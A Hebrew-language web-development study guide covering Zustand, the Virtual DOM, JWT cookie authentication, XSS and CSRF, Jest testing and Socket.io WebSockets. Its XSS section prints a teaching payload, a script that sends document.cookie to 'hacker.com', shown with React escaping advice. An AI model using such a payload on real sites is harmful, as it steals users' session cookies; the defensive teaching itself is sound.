1️⃣ ניהול State מתקדם (Redux / Zustand)

כשהאפליקציה גדלה, להעביר Props בין עשרות קומפוננטות הופך לסיוט (Prop Drilling). למרות ש-Context API פותר חלק מהבעיה, הוא גורם לרינדור מחדש (Re-render) של כל העץ בכל שינוי קטן. פה נכנסים לתמונה Redux ו-Zustand שמאפשרים עדכונים ספציפיים.

import { create } from 'zustand'; // 1. יצירת ה-Store const useBearStore = create((set) => ({ bears: 0, increasePopulation: () => set((state) => ({ bears: state.bears + 1 })), removeAllBears: () => set({ bears: 0 }), })); // 2. שימוש בקומפוננטה function BearCounter() { // שולפים רק מה שצריך - לא יהיה רינדור אם דברים אחרים משתנים! const bears = useBearStore((state) => state.bears); return <h1>{bears} bears around here...</h1> } function Controls() { const increasePopulation = useBearStore((state) => state.increasePopulation); return <button onClick={increasePopulation}>Add bear</button> }

2️⃣ איך React באמת עובד? (Virtual DOM)

ה-DOM של הדפדפן הוא אובייקט איטי. בכל פעם שמשנים בו משהו, הדפדפן צריך לחשב מחדש מיקומים ועיצובים (Reflow & Repaint). React המציאה את ה-Virtual DOM: העתק קל-משקל בזיכרון של ה-DOM האמיתי.

3️⃣ זרימת אימות (JWT vs Cookies)

איך עובד אימות מודרני מבוסס JWT ו-HttpOnly Cookie?

1 Browser → POST /login {email, password} → API
2 API → מאמת מול DB ומייצר JWT → DB
3 API → מחזיר עוגיה: Set-Cookie: token=...; HttpOnly → Browser
! ה-Token שמור בדפדפן, קוד JS לא יכול לגשת אליו (הגנת HttpOnly)
4 Browser → GET /api/private-data (עוגיה מצורפת אוטומטית) → API
5 API → מוודא JWT ומחזיר נתונים פרטיים → Browser

4️⃣ אבטחת מידע למפתחי ווב (XSS & CSRF)

1. XSS (Cross-Site Scripting)

התוקף מזריק קוד זדוני (לרוב JS) לתוך האתר שלנו, והקוד רץ בדפדפנים של משתמשים אחרים.

💻 הצג קוד דוגמה
// משתמש מכניס בתגובה לפוסט: <script> fetch('https://hacker.com/steal?cookie=' + document.cookie) </script> // איך מונעים ב-React? // React מגן אוטומטית כי הוא עושה Escaping לטקסט! // אבל אסור להשתמש בזה לעולם: <div dangerouslySetInnerHTML={{ __html: userInput }} /> ❌

2. CSRF (Cross-Site Request Forgery)

התוקף גורם לדפדפן של משתמש מחובר לשלוח בקשה זדונית לאתר שלנו (כי הדפדפן שולח עוגיות אוטומטית).

פתרון: הגדרת SameSite: 'Strict' בעוגיות, ושימוש ב-CSRF Tokens.

5️⃣ בדיקות — Jest בפועל

Mock Functions ו-Spy

// jest.fn() — יצירת mock const mockFn = jest.fn(); mockFn('hello'); expect(mockFn).toHaveBeenCalledWith('hello'); expect(mockFn).toHaveBeenCalledTimes(1); // Mock module שלם jest.mock('../api', () => ({ fetchUser: jest.fn().mockResolvedValue({ id: 1, name: 'Tal' }) }));

beforeEach / afterEach — Setup & Cleanup

describe('UserService', () => { let db; beforeEach(() => { db = createTestDB(); // אתחול לפני כל test }); afterEach(() => { db.close(); // ניקוי אחרי כל test }); test('creates user', async () => { const user = await db.createUser({ name: 'Tal' }); expect(user.id).toBeDefined(); expect(user.name).toBe('Tal'); }); });

toBe vs toEqual — מתי להשתמש?

// toBe — השוואת primitive / reference expect(1 + 1).toBe(2); // ✅ expect({a:1}).toBe({a:1}); // ❌ reference שונה! // toEqual — השוואת ערך עמוקה expect({a:1}).toEqual({a:1}); // ✅ deep equal expect([1,2]).toEqual([1,2]); // ✅
כלל זהב: tests טובים בודקים behavior, לא implementation. אם שינית את הקוד הפנימי בלי לשנות behavior — ה-test לא אמור להישבר.

6️⃣ תקשורת זמן אמת — WebSockets

HTTP הוא one-shot — client שולח request, server עונה וסוגר. לצ'אט/notifications/gaming צריך חיבור מתמשך דו-כיווני — WebSocket.

השוואה: HTTP vs WebSocket

HTTP
Client שולח → Server עונה → חיבור נסגר
WebSocket
Handshake → חיבור פתוח → שניהם שולחים מתי שרוצים

Server — Node.js + Socket.io

const io = require('socket.io')(server); io.on('connection', (socket) => { console.log('user connected:', socket.id); socket.on('chat-message', (msg) => { // שלח לכולם חוץ מהשולח socket.broadcast.emit('chat-message', msg); }); socket.on('disconnect', () => { console.log('user disconnected'); }); });

Client — React + Socket.io

import { useEffect, useState } from 'react'; import io from 'socket.io-client'; const socket = io('http://localhost:3000'); function Chat() { const [messages, setMessages] = useState([]); useEffect(() => { socket.on('chat-message', (msg) => { setMessages(prev => [...prev, msg]); }); // cleanup — חובה! return () => socket.off('chat-message'); }, []); const sendMessage = (text) => { socket.emit('chat-message', text); }; return (/* JSX */); }
שאלה נפוצה במבחן: מה ההבדל בין WebSocket ל-Long Polling?
Long Polling = client שולח request, server מחזיק אותו פתוח עד שיש חדשות — פחות יעיל. WebSocket = חיבור TCP מתמשך אמיתי — הרבה יותר יעיל.
